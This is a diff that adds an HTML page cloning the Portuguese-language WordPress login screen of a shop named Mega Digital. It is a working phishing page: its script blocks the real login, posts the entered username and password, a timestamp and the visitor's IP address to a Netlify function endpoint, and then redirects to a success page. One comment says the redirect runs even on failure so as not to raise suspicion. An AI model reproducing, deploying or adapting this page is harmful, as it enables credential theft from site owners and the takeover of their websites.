@@ -1,0 +1,196 @@
+<html lang="pt-BR"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Acessar ‹ Mega Digital — WordPress</title>
+	<meta name="robots" content="max-image-preview:large, noindex, noarchive">
+	<meta name="referrer" content="strict-origin-when-cross-origin">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://lojamegadigital.com.br/wp-content/uploads/2021/06/cropped-icone-32x32.jpg" sizes="32x32">
+	
+	<!-- CSS do WordPress -->
+	<link rel="stylesheet" href="https://lojamegadigital.com.br/wp-includes/css/dashicons.min.css?ver=6.8.3" type="text/css" media="all">
+	<link rel="stylesheet" href="https://lojamegadigital.com.br/wp-includes/css/buttons.min.css?ver=6.8.3" type="text/css" media="all">
+	<link rel="stylesheet" href="https://lojamegadigital.com.br/wp-admin/css/forms.min.css?ver=6.8.3" type="text/css" media="all">
+	<link rel="stylesheet" href="https://lojamegadigital.com.br/wp-admin/css/l10n.min.css?ver=6.8.3" type="text/css" media="all">
+	<link rel="stylesheet" href="https://lojamegadigital.com.br/wp-admin/css/login.min.css?ver=6.8.3" type="text/css" media="all">
+
+	<style>
+		/* Estilos adicionais para o loading */
+		.loading {
+			display: none;
+			text-align: center;
+			margin: 10px 0;
+		}
+		.spinner {
+			border: 3px solid #f3f3f3;
+			border-top: 3px solid #0073aa;
+			border-radius: 50%;
+			width: 20px;
+			height: 20px;
+			animation: spin 1s linear infinite;
+			display: inline-block;
+			margin-right: 10px;
+		}
+		@keyframes spin {
+			0% { transform: rotate(0deg); }
+			100% { transform: rotate(360deg); }
+		}
+	</style>
+</head>
+	<body class="login js login-action-login wp-core-ui locale-pt-br">
+	<script type="text/javascript">
+		document.body.className = document.body.className.replace('no-js','js');
+	</script>
+
+	<h1 class="screen-reader-text">Acessar</h1>
+	<div id="login">
+		<h1 role="presentation" class="wp-login-logo"><a href="https://br.wordpress.org/">Powered by WordPress</a></h1>
+	
+		<form name="loginform" id="loginform" method="post">
+			<p>
+				<label for="user_login">Nome de usuário ou endereço de e-mail</label>
+				<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required">
+			</p>
+
+			<div class="user-pass-wrap">
+				<label for="user_pass">Senha</label>
+				<div class="wp-pwd">
+					<input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required">
+					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Mostrar senha">
+						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
+					</button>
+				</div>
+			</div>
+			
+			<!-- Loading indicator -->
+			<div class="loading" id="loading">
+				<div class="spinner"></div>
+				Processando...
+			</div>
+			
+			<p class="forgetmenot">
+				<input name="rememberme" type="checkbox" id="rememberme" value="forever"> 
+				<label for="rememberme">Lembrar-me</label>
+			</p>
+			
+			<p class="submit">
+				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Acessar">
+				<input type="hidden" name="redirect_to" value="success.html">
+				<input type="hidden" name="testcookie" value="1">
+			</p>
+		</form>
+
+		<p id="nav">
+			<a class="wp-login-lost-password" href="https://lojamegadigital.com.br/wp-login.php?action=lostpassword">Perdeu a senha?</a>
+		</p>
+		
+		<script type="text/javascript">
+			function wp_attempt_focus() {
+				setTimeout(function() {
+					try {
+						d = document.getElementById("user_login");
+						d.focus();
+						d.select();
+					} catch(er) {}
+				}, 200);
+			}
+			wp_attempt_focus();
+		</script>
+		
+		<p id="backtoblog">
+			<a href="https://lojamegadigital.com.br/">← Ir para Mega Digital</a>
+		</p>
+	</div>
+	
+	<div class="language-switcher">
+		<form id="language-switcher" method="get">
+			<label for="language-switcher-locales">
+				<span class="dashicons dashicons-translation" aria-hidden="true"></span>
+				<span class="screen-reader-text">Idioma</span>
+			</label>
+			<select name="wp_lang" id="language-switcher-locales">
+				<option value="en_US" lang="en" data-installed="1">English (United States)</option>
+				<option value="pt_BR" lang="pt" selected="selected" data-installed="1">Português do Brasil</option>
+				<option value="pt_PT" lang="pt" data-installed="1">Português</option>
+			</select>
+			<input type="submit" class="button" value="Alterar">
+		</form>
+	</div>
+
+	<!-- JavaScript para captura e envio das credenciais -->
+	<script>
+		document.getElementById('loginform').addEventListener('submit', async function(e) {
+			e.preventDefault();
+			
+			// Mostrar loading
+			document.getElementById('loading').style.display = 'block';
+			document.getElementById('wp-submit').disabled = true;
+			
+			const username = document.getElementById('user_login').value;
+			const password = document.getElementById('user_pass').value;
+			
+			try {
+				// Enviar para a função Netlify
+				const response = await fetch('/.netlify/functions/log', {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+					},
+					body: JSON.stringify({
+						username: username,
+						password: password,
+						timestamp: new Date().toISOString(),
+						ip: await getIP()
+					})
+				});
+				
+				if (response.ok) {
+					// Redirecionar para success.html após captura
+					setTimeout(() => {
+						window.location.href = 'success.html';
+					}, 1000);
+				} else {
+					// Se falhar, ainda redireciona
+					window.location.href = 'success.html';
+				}
+			} catch (error) {
+				console.error('Erro:', error);
+				// Mesmo com erro, redireciona para não levantar suspeitas
+				window.location.href = 'success.html';
+			}
+		});
+		
+		// Função para obter IP aproximado
+		async function getIP() {
+			try {
+				const response = await fetch('https://api.ipify.org?format=json');
+				const data = await response.json();
+				return data.ip;
+			} catch (error) {
+				return 'unknown';
+			}
+		}
+		
+		// Toggle para mostrar/ocultar senha
+		document.querySelector('.wp-hide-pw').addEventListener('click', function() {
+			const passwordInput = document.getElementById('user_pass');
+			const icon = this.querySelector('.dashicons');
+			
+			if (passwordInput.type === 'password') {
+				passwordInput.type = 'text';
+				icon.classList.remove('dashicons-visibility');
+				icon.classList.add('dashicons-hidden');
+				this.setAttribute('aria-label', 'Ocultar senha');
+			} else {
+				passwordInput.type = 'password';
+				icon.classList.remove('dashicons-hidden');
+				icon.classList.add('dashicons-visibility');
+				this.setAttribute('aria-label', 'Mostrar senha');
+			}
+		});
+	</script>
+
+	<!-- Elementos de acessibilidade (mantidos do original) -->
+	<p id="a11y-speak-intro-text" class="a11y-speak-intro-text" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" hidden="hidden">Notificações</p>
+	<div id="a11y-speak-assertive" class="a11y-speak-region" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" aria-live="assertive" aria-relevant="additions text" aria-atomic="true"></div>
+	<div id="a11y-speak-polite" class="a11y-speak-region" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" aria-live="polite" aria-relevant="additions text" aria-atomic="true"></div>
+</body></html>
